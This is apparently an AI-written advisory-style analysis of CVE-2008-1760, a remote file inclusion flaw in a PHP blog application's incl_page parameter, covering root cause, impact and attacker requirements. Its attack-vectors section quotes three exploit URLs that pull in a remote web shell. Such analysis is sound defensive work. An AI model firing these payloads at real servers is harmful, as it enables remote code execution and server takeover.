Based on the provided information, here's an analysis of CVE-2008-1760:

**Root Cause of Vulnerability:**
The vulnerability is a Remote File Inclusion (RFI) flaw caused by the insecure use of the `include()` function in multiple PHP files (`struct_admin.php`, `struct_admin_blog.php`, and `struct_main.php`). These files directly include a file specified by the `incl_page` parameter without proper sanitization or validation.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The primary weakness is the ability to include remote files, allowing an attacker to execute arbitrary code.
- **Lack of Input Sanitization:** The application fails to sanitize or validate the `incl_page` parameter, making it vulnerable to RFI.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** An attacker can execute arbitrary PHP code on the server by including a malicious PHP file from a remote location.
- **Server Compromise:** Successful exploitation can lead to complete compromise of the server, potentially allowing the attacker to access sensitive data, modify files, or launch further attacks.

**Attack Vectors:**
- **HTTP GET Request:** The vulnerability can be exploited by crafting a malicious URL with the `incl_page` parameter set to a remote malicious file, such as a web shell.
  - Examples from exploit:
    ```
    http://localhost/[script]/_blogadata/include/struct_admin.php?incl_page=http://localhost/shell.txt?
    http://localhost/[script]/_blogadata/include/struct_admin_blog.php?incl_page=http://localhost/shell.txt?
    http://localhost/[script]/_blogadata/include/struct_main.php?incl_page=http://localhost/shell.txt?
    ```
- **Manipulation of `incl_page` Parameter:** The attacker controls the value of the `incl_page` parameter in the HTTP request.

**Required Attacker Capabilities/Position:**
- **Network Connectivity:** The attacker needs to be able to reach the vulnerable server over the network.
- **Basic HTTP Knowledge:** The attacker should understand how to craft HTTP requests to manipulate the `incl_page` parameter.
- **Malicious PHP File Hosting:** The attacker needs access to a server to host a malicious PHP file that they will include through the RFI vulnerability.
